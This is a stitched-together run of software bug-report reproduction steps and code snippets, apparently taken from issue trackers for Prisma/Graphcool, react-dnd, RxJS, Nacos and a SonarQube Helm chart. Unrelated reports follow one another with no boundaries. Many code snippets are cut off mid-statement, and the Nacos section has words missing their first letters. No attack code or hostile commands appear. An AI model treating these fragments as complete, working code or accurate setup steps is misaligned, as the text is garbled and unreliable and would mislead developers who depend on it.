this should cause sql exception since the schema violates the existing data in the database
type contentprovider { id: id! @unique type: contentprovidertype! @unique
} enum contentprovidertype { twitter
``` what i'm getting on console is repeated entries of these lines:
client sending query to cluster local +505ms client +1ms client query ($name: string! $stage: string!) { client migrationstatus(name: $name stage: $stage) { client projectid client revision client status client applied client rolledback client errors client } client } client +1ms client { stage: 'dev', name: 'foo' } +2ms client { migrationstatus: client { rolledback: 0, client applied: 6, client projectid: 'foo@dev', client errors: [], client revision: 2, client status: 'success' } } +20ms
create a vps anywhere with ubuntu 16.04
install docker and docker-compose
install node
install prisma
run `prisma local start`
it will not run and stay in a loop with `socket hang up`
- in my case, i had a query like so
return ctx.db.query.projects({ where: { and: { owner: { id: userid }, id } }, info)
- works fine in playground, but when run thru apollo, apollo adds `__typename` throut query
- console shows ```
response from
{ "projects": [ { "__typename": "project" } ]
** workaround **
- remove `info` from query
`cd` into project directory `prisma delete` ![prisma_delete]( `prisma list` ![list_after_delete]( the name is still in the list and the service url is still active
trying `prisma delete` again (just for fun): ![try_to_delete_again]( it seems something happened after the first `prisma delete` but the service is still on the service list and the service url is still active
`prisma deploy --interactive`
prisma init with type-script-advanced
i'm simply trying to follow the quick-start guide from here 1
prisma init with type-script-advanced as the server type
prisma deploy
add below type in database/datamodel.graphql
type like { id: id! @unique post: post! likedby: user!
prisma deploy
register using an email that has a "." and try to use `prisma deploy` on that.
i can not easy reproduce it anymore
i hacked it into the cli-core to reproduce my console output and was able if the getbinpath returns nothing
than i had exactly the same result
i think this was my problem
after some talk in slack with "@agartha kim brandwijk" i installed the graphql-cli and at some point it was working .
maybe because the getbinpath was somehow available
the function getbinpath in was not returning the binary
and there is no else with a log for the user
initialize a project with `prisma init`
use `prisma local nuke` to clean up the local
try `prisma deploy --dry-run`.
#reproduction
> graphcool-framework/0.11.5 (linux-x64) node-v8.9.4 **expected behaviour**
logs for function no-logs should be created, too.
add `@default` to a field and try to create with upsert, leaving out the field
create a new project using **graphql create** chose boilerplate project as node-advanced
add a new env file ".env.prod" change stage to "prod"
run **graphcool deploy -e .env.prod** cli throws the following error: ![image]( this is happening because the script adds a duplicate cluster key in the graphcool.yml file
![image]( deleting the duplicate key and adding the cluster value to the variables set in .env.prod then deploying again resolves the issue and generates a graphcool endpoint
more info: **versions of graphcool and graphql-cli** graphcool: graphcool/1.0.0-beta4.1.1
graphql-cli: 2.10.1
run `graphql create`
do not enter a directory name and hit enter
select a boilerplate project (node-advanced in my case)
select cluster cli throws the following error: ![image]( this is happening because the script generates a service name as "." in the **graphcool.yml** file
it should, in turn, generate a valid name to avoid confusion
**versions of graphcool and graphql-cli** graphcool: graphcool/1.0.0-beta4.1.1
graphql-cli: 2.10.1
type customer{
id: id! @unique
name: string!
tenant: tenant! @relation:"tenantcustomers"
} type tenant{
id: id! @unique
name: string!
customers: [customer!]! @relation:"tenantcustomers"
} mutation upsertcustomer($id: id!, $name: string!) {
upsertcustomer(where: {id: $id}, create: {name: $name, mandant:{connect:{id:"your tenant value"}}}, update: {name: $name}) { id name mandant{id} }
``` **result playground**
{ "data": null, "errors": [ { "message": "unsupported scalar value in slickextensions: listmap(connect -> some(listmap(id -> some(your value))))", "locations": [ { "line": 2, "column": 3 } ], "path": [ "upsertcustomer" ]
``` **result server debug log**
[graphql error]: message: unsupported scalar value in slickextensions: listmap(connect -> some(listmap(id -> some(your value)))), location: [object object], path: upsertcustomer
response from
error: unsupported scalar value in slickextensions: listmap(connect -> some(listmap(id -> some(your value)))) at object.checkresultandhandleerrors (c:\\dev\\xxx\\server\ ode_modules\\graphql-tools\\src\\stitching\\errors.ts:84:7) at object.<anonymous> (c:\\dev\\xxx\\server\ ode_modules\\graphql-tools\\src\\stitching\\delegatetoschema.ts:97:14) at step (c:\\dev\\xxx\\server\ ode_modules\\graphql-tools\\dist\\stitching\\delegatetoschema.js:40:23) at object.next (c:\\dev\\xxx\\server\ ode_modules\\graphql-tools\\dist\\stitching\\delegatetoschema.js:21:53) at fulfilled (c:\\dev\\xxx\\server\ ode_modules\\graphql-tools\\dist\\stitching\\delegatetoschema.js:12:58) at <anonymous> at process._tickdomaincallback (internal/process/next_tick.js:228:7) ```
const fromevent = require('graphcool-lib').fromevent
const er = (err) => { console.log(err.message) return { error: err.message }
const mupdatetoken = `
mutation($tokenid:id! $balance:float!){ updatetoken( id:$tokenid balance:$balance ){ id balance }
` const updatetokenbalance = async (api,tokenid,balance) => { return (await api.request(mupdatetoken,{tokenid,balance}) .catch(er))
} const addminted = (a,el) =>{ if (el.transactiontype==="mint"){ return a + parsefloat(el.ammount) }
} const init = async function(event){ const graphcool = fromevent(event) const api = graphcool.api('simple/v1') // console.log(event.data.tokentransaction.node) var token = event.data.tokentransaction.node.token console.log(token) var minted = token.transactions.reduce(addminted,0) console.log('found total minted',minted) balance = minted var finished = (await updatetokenbalance(api,token.id,balance).catch(er)) console.log(finished) return {data:{success:true}}
} module.exports = init
subscription { tokentransaction(filter: { mutation_in: [created] }) { node{ token{ id transactions{ transactiontype ammount } } } }
} ``` ``` updatewalletbalance: type: subscription query: ./src/tokentransactioncreated.graphql handler: code: src: src/updatewalletbalance.js
> graphcool-framework init build-test
> graphcool-framework deploy
``` there are two ways to see the results: using docker, or with a debug flag (see below) ## docker
the following instructions are written with a local cluster (graphcool running on docker) in mind ```bash
> docker ps
> docker exec -it {localfaas} /bin/bash
``` ### inside the docker-container:
find the current deployment
bash-4.3# cd /var/faas/deployments/cjc56e125006e0143y6g2ihga/cjc56e251006z0143jn48xl1c/
view contents of deployment:
bash-4.3# ls -al
drwxr-xr-x 4 root root 4096 jan 7 19:32 .
drwxr-xr-x 3 root root 4096 jan 7 19:32 ..
drwxr-xr-x 2 root root 4096 jan 7 19:32 .build
-rw-r--r-- 1 root root 63 jan 7 19:32 .graphcoolrc
-rw-r--r-- 1 root root 1249 jan 7 19:32 graphcool.yml
-rw-r--r-- 1 root root 89 jan 7 19:32 package.json
drwxr-xr-x 2 root root 4096 jan 7 19:32 src
-rw-r--r-- 1 root root 554 jan 7 19:32 types.graphql
here you can already see the presence of a `.build` folder
so let's look inside: ```bash
bash-4.3# ls -al .build
drwxr-xr-x 2 root root 4096 jan 7 19:32 .
drwxr-xr-x 4 root root 4096 jan 7 19:32 ..
-rw-r--r-- 1 root root 1413 jan 7 19:32 build.zip
``` the `build.zip` file is included within the bundled deployment
but the contents are not readable ```bash
bash-4.3# unzip -vl .build/build.zip
archive: .build/build.zip length method size cmpr date time crc-32 name
-------- ------ ------- ---- ---------- ----- -------- ----
unzip: can't find file table
``` ## debug flag the current behavior can also be observed by setting an env variable `debug=bundler` when deploying: ```bash
> debug=bundler graphcool-framework deploy
this prints the following lines:
bundler /users/user/work/build-test/.build/build.zip +0ms
bundling functions..
bundler added files [ \'.graphcoolrc\', \'graphcool.yml\', \'package.json\', \'src/\', \'types.graphql\', \'.build/build.zip\', \'.build/dist/\', \'src/hello.graphql\' ] +18ms bundler converted files [ \'/users/user/work/build-test/src/hello.js\' ] +625ms bundler createdfiles [ \'/users/user/work/build-test/.build/dist/src/hello.js\' ] +0ms bundler adding /users/user/work/build-test/.build/dist/src/ src/ +13ms bundler adding /users/user/work/build-test/.build/dist/src/byline.js src/byline.js +0ms bundler adding /users/user/work/build-test/.build/dist/src/hello-dev.js src/hello-dev.js +0ms bundler adding /users/user/work/build-test/.build/dist/src/hello-lambda.js src/hello-lambda.js +0ms bundler adding /users/user/work/build-test/.build/dist/src/hello.js src/hello.js +0ms bundler added build files [ \'src/\', \'src/byline.js\', \'src/hello-dev.js\', \'src/hello-lambda.js\', \'src/hello.js\' ] +0ms bundler uploading to +172ms bundler { bundler "success" : true bundler } +41ms bundler bundled 867 +0ms 868ms
and it's clearly visible that `.build/build.zip` is added to the bundle, including `.build/dist/`.
i'm using `graphcool-framework/0.11.4`
it's installed globally
this error happens for any zip file
even if i put a movie in it, so i assume its not a problem with the data...
i'm very sorry - i don't have a reproducible case but i did my best to describe the issue.
initialized a new service with the latest beta
haven't changed anything in either file
graphcool/1.0.0-beta2.1.1 (windows-x64) node-v9.3.0 i am quite a rookie with docker, i am not entirely sure it's properly installed as i had to use some legacy docker toolkit due to incompatibility with virtualbox.
newest version of chrome, edit / create function via web console, write `subscription_query`, hit `ctrl+space`
in your resolver function return something like this:
return 'bar';
instead of:
return { data: { foo: 'bar' } }
graphcool init
``` replace the wildcard permission in `graphcool.yml` with this: ```
permissions: - operation: "user.read"
graphcool deploy # choose local
curl \' -h \'origin: -h \'accept-encoding: gzip, deflate, br\' -h \'content-type: application/json\' -h \'accept: */*\' -h \'connection: keep-alive\' -h \'dnt: 1\' --data-binary \'{"query":"query {\ someuserexists\ }","variables":""}\' --compressed -h \'authorization: bearer __token__\'
``` where `__service_id__` is the service id and `__token__` is the platform token from `~/.graphcoolrc`
response: ```json
{ "code": 3008, "requestid": "local:simple:cjbgk7pxj003g0186u59ldoie", "error": "insufficient permissions for this query"
running macos 10.13.1
running version 0.10.1 of graphcool i started the project with graphcool init following the quickstart tutorial.
create new model, and add fields to existing models, and attempt to subscribe to them as shown above
initialize a new project, and create a function that throws an error in a try block
catch it and attempt to console.log the error
you can also try applying the google auth template, and calling googleauthentication with a bad token (which will trip into this logic path).
type user @model { createdat: datetime! id: id! @isunique updatedat: datetime! name: string!
``` open this subscription: ```graphql subscription usersubscription($id: id!) { user(filter: { and: [{ mutation_in: [updated] }, { node: { id: $id } }] }) { node { id name } } }
``` but send no variables: ![image](
create a new service: ```graphql
type item @model { id: id! @isunique jsons: [json!]!
``` create a new `item` node: ```graphql
mutation { createitem( jsons: [] ) { id jsons }
``` copy the `id` and use it as the `$id` variable for all subsequent mutations of this form: ```graphql
mutation b($id: id!, $jsons: [json!]!) { updateitem( id: $id jsons: $jsons ) { jsons }
``` ```json
{ "id": "cjalap061bdom0112pnej28n2", "jsons": [""]
``` all of the following values for `$jsons`will result in invalid data written into `jsons: [json!]!` for mutation `b`: * `"jsons": [""]`
* `"jsons": ["{}"]`
* `"jsons": ["asjdabsdasd"]` for reference, this is the correct way to specify a variable of type `[json!]!` in the playground, even though it will be marked as invalid by the validation/autocompletion: `"jsons": [{"a": 1, "b": "c"}, {"c": 2}]`
original type definition:
type connection @model{ ..
connectionsuggestion: connectionsuggestion @relation(...) ...
``` modified definition:
type connection @model{ ..
connectionsuggestions: [connectionsuggestion!]! ...
``` subscription:
subscription { connectionsuggestion( filter: { mutation_in: [updated] updatedfields_contains_every: ["accepted"] } ) { node { id connection { //this is the type from above
connectionid: id connectionsuggestions { id accepted } } } }
``` when trying to deploy the modified definition alongside the new subscription i am met with this error: `the supplied query for the server side subscription 'moveconnectiontoscheduled-subscription' is invalid
cannot query field 'connectionsuggestions' on type 'connection'
did you mean 'connectionsuggestion' or 'connectiontime'? `
as you can see the new field isn't being recognized in the schema for some reason.
setup graphcool framework with the pusher template:
setup pusher
then send a push notification to a mobile app or the test web app as per the template readme.
- login to the console
- click playground
- click on the key icon of the top right corner
- run `query querytest($user_id:id!){ someuserexists(filter:{id:$user_id}}`
- get an error stating that there's no such query, and then relating me to _allusersmeta and stuff
please check [this forum post]( with additional information such as screenshots and logs.
this happens given a **graphcool.yml** similar to this: ```
custom: dev: auth0_domain: "xxxx" auth0_api_identifier: "xxxx" prod: auth0_domain: "xxxx" auth0_api_identifier: "xxxx" types: ./types.graphql functions: authenticate: handler: code: src: ./src/auth0/auth0authentication.js environment: auth0_domain: ${self:custom.${opt:target}.auth0_domain} auth0_api_identifier: ${self:custom.${opt:target}.auth0_api_identifier} type: resolver schema: ./src/auth0/auth0authentication.graphql
see from @timwis for an excellent example.
1) delete the `.graphcoolrc` file.
2) set graphcool_target environment variable to a valid target
3) use one of the aforementioned commands
4) see error:
> please provide a valid target that points to a valid cluster and service id
- deploy to local cluster
- trigger a function
- check the context
see
open and click any link to another graph.cool doc
all these links are missing the `/docs` path
` ` => ` `
see #1091 for reproduction steps
- on (at least my setup of) ubuntu 16.04 docker-compose requires sudo to access the docker-daemon
- execute above with that env to recreate
copy and deploy the "rest-wrapper" project from `/examples`
try to query for `allbreeds`:
{ allbreeds { name }
observe the error in playground:
{ "data": null, "errors": [ { "locations": [ { "line": 2, "column": 3 } ], "path": [ "allbreeds" ], "code": 5000, "message": "a function returned an unhandled error
please check the logs for executionid \'eu-west-1:simple:cj9bvxgka004l0175qf4rww70\'", "requestid": "eu-west-1:simple:cj9bvxgka004l0175qf4rww70" } ]
view `graphcool logs`:
2017-10-28t21:46:35.388z 147ms failure { "error": "function returned invalid status code: 0
raw body: {\\"logs\\":[{\\"stdout\\":\\"\\"},{\\"stderr\\":\\"\\"},{\\"error\\":\\"no content to map due to end-of-input\\\ at [source: ; line: 1, column: 0]\\"}],\\"response\\":{\\"error\\":\\"function did not return a valid response
check your function code / logs.\\"}}"
try to use subscriptions via playground, e.g.
subscription { tracing(filter: {mutation_in: [created]}) { node { id } }
hit play button and got error
subscription { myuser { node { id name } }
code generation:
return client.request(` { myuser { node { id name } } } `)
the code generation for browser/fetch strips all spaces, also resulting in an invalid request:
{"query":"subscription{myuser{node{idname}}}"}
when you open the playground, 'admin' is selected
but executing any query will quickly reveal that queries are initially run as 'everyone'.
only when selecting 'everyone', and then 'admin' again, is the header actually added to the request (and visible on screen), and the query actually executed as admin.
running graphcool deploy
- i create a second local cluster with `graphcool local up --name second`.
- the cluster is succesfully added to ~/.graphcoolrc
- when i run `graphcool deploy -t newstage`, it only shows one local cluster (local).
create a model with a field called `input` and run the mutation.
type a implements node { f: float createdat: datetime! id: id! @isunique updatedat: datetime!
``` ```graphql
mutation { createa(f: 1.23456789012345678) { id }
``` ```json
{ "data": null, "errors": [ { "message": "argument \'f\' expected type \'float\' but got: 1.23456789012345678
reason: float or int value is too bit to fit in double (line 2, column 14):\ createa(f: 1.23456789012345678) {\ ^", "locations": [ { "line": 2, "column": 14 } ] } ]
``` **what is the expected behavior?** a better wording than `reason: float or int value is too bit to fit in double` should be presented to the user.
check this on ie11.
use drag handle to drag item, it will display only handle being dragged.
create a blank html document with script tags that include the following: react.development.js & react-dom.development.js (both v
16.8.0) and reactdnd.js & reactdndhtml5backend.js (both v
9.4.0, from the dist/umd folders of the react-dnd and react-dnd-html5-backend node_modules folders).
[live reproduction]( 1
click on 'drag me by the handle good', it works well
click on 'drag me by the handle bad', see error
```ts
import { observable, firstvaluefrom } from 'rxjs'; const values = [1,2,3]
const source = new observable(subscriber => { while (!subscriber.closed && values.length) { subscriber.next(values.shift()!) } subscriber.complete();
}); firstvaluefrom(source).then(console.log);
console.log(values) // expect values = [2, 3]
import { from } from 'rxjs'; import { sharereplay } from 'rxjs/operators'; const source = from([1, 2, 3, 4]).pipe( sharereplay(1)
); source.subscribe(x => console.log(x));
// the console only logs 4
rx.interval(10).pipe( take(3), filter(() => false), timeout(1000)
).subscribe((x) => { console.log(x) }, null, () => { console.log('complete') });
note that this use a forked rxjs version
i just packaged head and included dist in the repo, to easily add the dependency in package.json
npm install both a and b
node a/main.js project a: const {from, of, interval} = require('rxjs')
const {switchmap, take} = require('rxjs/operators')
const { create$, // re-exporting rxjs also allows it to exit properly // rxjs: {from, of, interval}, rxjsoperators: {switchmap, take}
} = require('b/main') const b$ = create$() // process doesn't exit
// const b$ = from(create$()) // exits properly
// const b$ = of('b') // exits properly b$.pipe( switchmap(b => interval(100)), take(3)
).subscribe( next => console.log('next', next), error => console.log('error', error), () => console.log('complete'),
``` project b: ```js
const {of} = require('rxjs') module.exports = { create$: () => of('b'), // re-export rxjs as a workaround rxjs: require('rxjs'), rxjsoperators: require('rxjs/operators')
const { port1 } = new messagechannel()
const subscription = new subscription(() => { port1.close()
subscription.unsubscribe()
console.log(subscription._unsubscribe)
const window = timer(0, 100) .pipe( windowtime(1000), take(3), flatmap( value => value.pipe(toarray())) )
we could reproduce our production problem when using a delay in the pipe
we are using delaywhen, maybe it has the same side-effect as delay:
in production we use a very simplified version of the following sb:
with delay, the finalize is called before next value or on complete.
of(1).pipe( // without the next line, the error is caught correctly mergemap(async () => 2), // this usage should produce a runtime typeerror: you provided 'null' where a stream was expected
mergemap(() => null), catcherror(error => { console.error('error in the stream caught:', error.message); return []; })
).subscribe();
from([]).pipe(single(()=>false)).pipe(tap((v)=>console.log(v))).subscribe(); //error [emptyerror]: no elements in sequence] from(['x']).pipe(single(()=>false)).pipe(tap((v)=>console.log(v))).subscribe(); //undefined from([]).pipe(first(()=>false)).pipe(tap((v)=>console.log(v))).subscribe(); //[error [emptyerror]: no elements in sequence] from(['x']).pipe(first(()=>false)).pipe(tap((v)=>console.log(v))).subscribe(); //[error [emptyerror]: no elements in sequence]
const {finalize, first} = require('rxjs/operators')
const anothermodule$ = require('b')
const samemodule$ = require('./c') anothermodule$.pipe( // stream from another module doesn't finalize finalize(() => console.log('a finalized b')), first()
).subscribe() samemodule$.pipe( // stream from same module finalize finalize(() => console.log('a finalized c')), first()
).subscribe() ```
const o$ = fromfetch(url, {})
o$.subscribe()
o$.unsubscribe()
o$.subscribe()
import { map, delay, tap, take } from 'rxjs/operators';
import { observable, of, interval } from 'rxjs'; // console log every 1 second
interval(1000).pipe( take(17)
).subscribe(num => { if (num === 10) console.log(num + `: expecting to see 'innittimeplus10s' here...`); else console.log(num);
}); // save time on file init and then create date for 5 seconds and 10 seconds from init
const inittime = new date();
const inittimeplus5s = new date(inittime.gettime() + 5000);
const inittimeplus10s = new date(inittime.gettime() + 10000); // console log after 5 seconds after init, and again after 10 seconds _after init_
of(null).pipe( delay(inittimeplus5s), tap(() => console.log('inittimeplus5s')), delay(inittimeplus10s), tap(() => console.log('inittimeplus10s')),
).subscribe();
this does not represent the flow on which i had the issue is just a simplification of the problem
import { observable } from 'rxjs';
import { catcherror, delay } from \'rxjs/operators\'; const observable$ = new observable(observer => { observer.error("error thrown") observer.complete()
}) const observablewithdelay$ = new observable(observer => { observer.next("delayed data") observer.complete()
}).pipe(delay(3000)) observable$.pipe( catcherror(err => observablewithdelay$)
.subscribe( data => console.log(`the data ${data}`), err => console.log(`the error ${err}`), () => console.log('end')
the result is :
``` rather than ```
dalayed data
code example links above
-minimum code which reproduces bug: run "npm start" from within the "app" folder or open this link
and open console
code from the "app" which reproduces the issue: import { behaviorsubject, interval } from \'rxjs\';
import createobservable from 'lib'; const subject1 = new behaviorsubject(undefined);
createobservable().subscribe(subject1); const subject2 = new behaviorsubject(undefined);
interval(1000).subscribe(subject2); subject1.subscribe(v => { console.log(`observable from lib: value=${v} getvalue()=${subject1.getvalue()}`);
}); subject2.subscribe(v => { console.log(`observable from app: value=${v} getvalue()=${subject2.getvalue()}`);
code from the "lib": ```js
import { interval } from 'rxjs'; export default function createobservable() { return interval(1000);
``` console output: observable from lib: value=undefined getvalue()=undefined
observable from app: value=undefined getvalue()=undefined
observable from lib: value=0 getvalue()=undefined
observable from app: value=0 getvalue()=0
observable from lib: value=1 getvalue()=undefined
observable from app: value=1 getvalue()=1
- repo link: please have a look at [github repo](
- stackblitz: same repo source code imported from github [here]( export class personcomponent implements oninit, ondestroy { public person: any; private unsubscribe$ = new subject(); constructor(private api: apiservice, private route: activatedroute) { } ngoninit() { this.route.params.pipe( switchmap(_ => this.api.find()), takeuntil(this.unsubscribe$), ).subscribe({ next: (person) => { this.person = person; console.log(person); }, complete: () => console.log('subscription completed'), }); } ngondestroy() { this.unsubscribe$.next(); this.unsubscribe$.complete(); console.log('person component destroyed') }
} @injectable({ providedin: 'root' })
export class apiservice { private cache = {}; constructor(private http: httpclient) { } public find(id = 1): observable<any> { let res = this.cache[id]; if (!res) { res = this.http.get(` {id}`).pipe( sharereplay({ buffersize: 1, refcount: true }), ) this.cache[id] = res; } return res; }
fix repo
import { interval } from 'rxjs';
import { windowtime, mergeall } from 'rxjs/operators'; const timer = interval(200)
const result = timer.pipe( windowtime(1000, 600, 4), mergeall(),
result.subscribe(x => console.log(x));
this code: ```ts
import { defer, empty, of, race, throwerror } from "rxjs";
import { delay } from "rxjs/operators"; race( defer(() => { console.log("subscribed to 1"); return of(1).pipe(delay(100)); }), defer(() => { console.log("subscribed to empty"); return empty; }), defer(() => { console.log("subscribed to 3"); return of(3).pipe(delay(300)); })
).subscribe({ complete: () => console.log("won"), error: () => console.log("won with error")
``` will output: ```
subscribed to 1
subscribed to empty
subscribed to 3
``` and this code: ```ts
race( defer(() => { console.log("subscribed to 1"); return of(1).pipe(delay(100)); }), defer(() => { console.log("subscribed to error"); return throwerror(new error("kaboom")); }), defer(() => { console.log("subscribed to 3"); return of(3).pipe(delay(300)); })
).subscribe({ complete: () => console.log("won"), error: () => console.log("won with error")
``` will output: ```
subscribed to 1
subscribed to error
won with error
subscribed to 3
```ts
import { defer } from 'rxjs'; const example = defer(() => {}); // type of example is observable<any> but should be observable<never>.
[here's an example using fromfetch(...) and from(fetch(...)) that i would expect to have the same result.]( this code throws an aborterror: fromfetch(' .pipe(switchmap(resp => resp.json())) .subscribe(json => console.log(json));
forkjoin(promise.resolve('hello')).subscribe(result => console.log(result));
[stackblitz](
an example of both scenarios is shown in the testing changes in #4446
test code ```html
<!doctype html>
<html lang="en">
<head> <meta charset="utf-8"> <title>variable leaked</title> <style> #app { margin: 2em; padding: 1em; font-family: "roboto mono", "source code pro", monospace; font-weight: 500; font-size: 1.125rem; line-height: 1.6; } </style>
<body> <div id="app"></div> <script> document.a = object.keys(window);
</script> <script src=" "></script> <script> document.b = object.keys(window); document.c = {}; document.d = []; document.a.foreach(x => { document.c[x] = true; }); document.b.foreach(x => { if (!document.c[x]) { document.d.push(x); } }); (function(leaked, fragment) { console.log(leaked); leaked.reduce((p, c) => { p.appendchild(document.createtextnode(c)); p.appendchild(document.createelement(\'br\')); return p; }, fragment); self.app.appendchild(fragment); })(document.d, document.createdocumentfragment());
</script> </body>
</html> ```
- from `xstream` to `rxjs`, does not work: const { from: observablefrom } = require('rxjs')
const { isinteropobservable } = require('rxjs/internal/util/isinteropobservable')
const { default: xs } = require('xstream') const num$ = xs.from([ 1, 2, 3, 4 ])
console.log('is num$ an observable?', isinteropobservable(num$)) // false const adapt$ = observablefrom(num$) // error here
adapt$.subscribe(console.log)
- from `xstream` to `rxjs`, working after importing `xstream` first:
const { default: xs } = require('xstream')
const { from: observablefrom } = require('rxjs')
const { isinteropobservable } = require('rxjs/internal/util/isinteropobservable') const num$ = xs.from([ 1, 2, 3, 4 ])
console.log('is num$ an observable?', isinteropobservable(num$)) // true const adapt$ = observablefrom(num$)
adapt$.subscribe(console.log)
- the same behaviour in `most`, not working:
const { from: observablefrom } = require('rxjs')
const { isinteropobservable } = require('rxjs/internal/util/isinteropobservable')
const most = require('most') const num$ = most.from([ 1, 2, 3, 4 ])
console.log('is num$ an observable?', isinteropobservable(num$)) // false const adapt$ = observablefrom(num$) // error here
adapt$.subscribe(console.log)
- we cannot convert `rxjs` to `xstream` either unless we import `xstream` first:
const { from: observablefrom } = require('rxjs')
const { default: xs } = require('xstream') const num$ = observablefrom([ 1, 2, 3, 4 ])
const adapt$ = xs.from(num$) adapt$.addlistener({ next: console.log
6.3.3 (`e.stack` is `undefined`): 6.2.2 (`e.stack` is defined): my guess is that is what broke the traces.
function called() { console.log('called'); } const subject = new subject();
const destroyed = new subject(); const subscription = subject .pipe(takeuntil(destroyed)) .subscribe(() => called()); console.log(subject.observers.length); // 1 subject.next(); // called
subject.next(); // called // unsubscribe from subject
destroyed.next(true);
destroyed.complete(); console.log(subject.observers.length); // still 1, expected: 0 subscription.unsubscribe();
subject.next(); // no console.log('called') console.log(subject.observers.length); // still 1, expected: 0
import { observable, partialobserver } from 'rxjs'; const o = new observable(); function foo<t>( next?: partialobserver<t>|((value: t) => void), error?: (err: any) => void, complete?: () => void,
) { o.subscribe(next, error, complete); // error here
import { timer, from } from 'rxjs';
import { concatmap, tap } from 'rxjs/operators'; function wait(ms){ return new promise(res => { settimeout(() => res('poop'), ms); })
} timer(10).pipe( concatmap(() => from(wait(20)).pipe( concatmap(() => { console.log('here'); return from(wait(20)).pipe( tap(x => console.log('>', x)) ); }) ))
.subscribe(x => console.log('>', x));
<!doctype html>
<html lang="zh-cn"><head>
<meta charset="utf-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="renderer" content="webkit">
<title>rxjs test</title>
<body> <h>rxjs test</h> <script src=" " ></script> <script src=" " ></script> <script> var st = new set() st.add(\'foo\') try { var arr = array.from(st) console.log(arr) alert(arr) } catch(ex) { alert(ex) } </script>
</html> ```
create `websocketsubject`
create two subscriptions on `websocketsubject`
wait a second
unsubscribe both subscriptions and immediately create two new ones
repeat steps 3 and 4
unsubscribe both subscriptions in case the stackblitz does not work, here is the code it contains: <details><summary>show imports and utility class</summary>
import { empty, interval, merge } from "rxjs";
import { websocket } from "rxjs/websocket";
import { switchmap, take } from "rxjs/operators"; function log(message: string) { console.log(message);
} function error(err: any) { console.error(err);
} class loggingwebsocket implements websocket { private static nextsocketid = 0; readonly socketid = loggingwebsocket.nextsocketid++; readonly connecting: number = 0; readonly open: number = 1; readonly closing: number = 2; readonly closed: number = 3; binarytype = "blob"; readonly bufferedamount: number = 0; readonly extensions: string = ""; onclose: ((this: websocket, ev: closeevent) => any) | null = null; onerror: ((this: websocket, ev: event) => any) | null = null; onmessage: ((this: websocket, ev: messageevent) => any) | null = null; onopen: ((this: websocket, ev: event) => any) | null = null; readonly protocol: string; readystate: number = this.connecting; constructor( public readonly url: string, public protocols: string | string[] = "" ) { this.protocol = array.isarray(protocols) ? protocols[0] || "" : protocols; log("created socket " + this.socketid); settimeout(() => { this.readystate = this.open; log("opened socket " + this.socketid); this.dispatchevent({ type: "open" }); }, 100); } close(code?: number | undefined, reason?: string | undefined): void { this.readystate = this.closing; log("closing socket " + this.socketid); settimeout(() => { this.readystate = this.closed; log("closed socket " + this.socketid); this.dispatchevent({ type: "close", wasclean: true, code, reason }); }, 100); } send(data: string | arraybuffer | blob | arraybufferview): void { if (this.readystate === this.open) { log("socket " + this.socketid + " sends: " + data); } else { throw new error( "socket unable to send, because readystate=" + this.readystate ); } } addeventlistener(type: any, listener: any, options?: any) { throw new error("method not implemented."); } removeeventlistener(type: any, listener: any, options?: any) { throw new error("method not implemented."); } dispatchevent(evt: { type: string; [x: string]: any }): boolean { const handler = (this as any)["on" + evt.type]; if (handler) { evt.target = this; handler.call(this, evt); } return true; }
</details> ```ts
const socket = websocket<any>({ url: "ws://localhost/ws", websocketctor: loggingwebsocket
}); function multiplex(id: number, index: number) { return socket.multiplex( () => "sub" + id + "." + index, () => "unsub" + id + "." + index, value => value === id + "." + index );
} interval(1000) .pipe( take(4), switchmap(id => { if (id < 3) { return merge(multiplex(id, 1), multiplex(id, 2)); } return empty(); }) ) .subscribe( () => {}, err => error(err), () => log("complete") );
``` i would expect the log to show the following, but the lines with the strike-through are missing: created socket 0
opened socket 0
socket 0 sends: "sub0.1"
socket 0 sends: "sub0.2"
socket 0 sends: "unsub0.1"
socket 0 sends: "unsub0.2"
closing socket 0
created socket 1
closed socket 0
opened socket 1
~~socket 1 sends: "sub1.1"~~
~~socket 1 sends: "sub1.2"~~
socket 1 sends: "unsub1.1"
~~socket 1 sends: "unsub1.2"~~
~~closing socket 1~~
created socket 2
~~closed socket 1~~
opened socket 2
socket 2 sends: "sub2.1"
socket 2 sends: "sub2.2"
socket 2 sends: "unsub2.1"
socket 2 sends: "unsub2.2"
closing socket 2
closed socket 2
const assert = require('assert');
const { from } = require('rxjs');
const microstates = require('microstates').default; let ms = microstates.from([{hello: 'world'}]); from(ms).subscribe(next => assert(next[0], 'should have an array with one item'))
1 un a nacos cluster
2 odify old nacos cluster every member's cluster.conf file in {nacos.home}/conf
3 tart a new nacos node that it's cluster.conf have old nacos cluster member info
4 ee naming-raft or nacos.log will find err message like "can not find peer xxxx"
clone the main repository code
execute mvn -prelease-nacos clean install -u -dmaven.test.skip=true maven command build
cluster mode modify the configuration file server.port
modified configuration file port essentially started port not in effect or 8848
set `nacos.server.ip` as localhost:8848
start server
check log and find start failed
publish a config in acm
use 1.3.1 or 1.3.2 version sdk get the config
print the config got from acm
see garbled text
.3.0 rg.apache.commons.lang3.math.numberutils.toint(string str, int defaultvalue)
om.alibaba.nacos.common.utils.convertutils.toint(string val, int defaultvalue)
al ${nacos.config.maxretry${nacos.maxretry:}}
login with wrong username or password
you will see the following error log in the console 2020-08-26 15:52:40.709 error 9140 --- [.naming.updater] c.a.nacos.client.security.securityproxy : [securityproxy] login http request failed url: params: {username=nacos}, bodymap: {password=abc}, errormsg: errcode: 100, errmsg: nacos serialize for class [com.alibaba.nacos.common.http.httprestresult] failed.
go to 'edit configuration'
change content.
click on first 'revert chunk' ![1](
click on 'publish' ![2](
go to 'configuration details' ![3](
turn on permissions to start the service.
log in as a user without a certain naming authority.
ser (new_spaces) (new_role)
(user) (new_spaces) ublic
acos discovery 4
install chart behind a proxy
put values in values.yaml for "sonarproperties" sonarproperties: sonar.security.realm: ldap and execute helm install --debug --dry-run --name code-quality stable/sonarqube --values=sonarqube_vars.yaml
pring boot ybatis mysql jar , ysql 5.6 penfeigh ureka nacos
2.myabtis
``` <insert id="addlist" parametertype="list" usegeneratedkeys="true" keyproperty="id" > insert into t_member (merchantid,member_name,create_time) values <foreach collection="list" separator="," index="member" item="member" > ( #{member.merchantid}, #{member.membername}, #{member.createtime} ) </foreach> </insert>
order
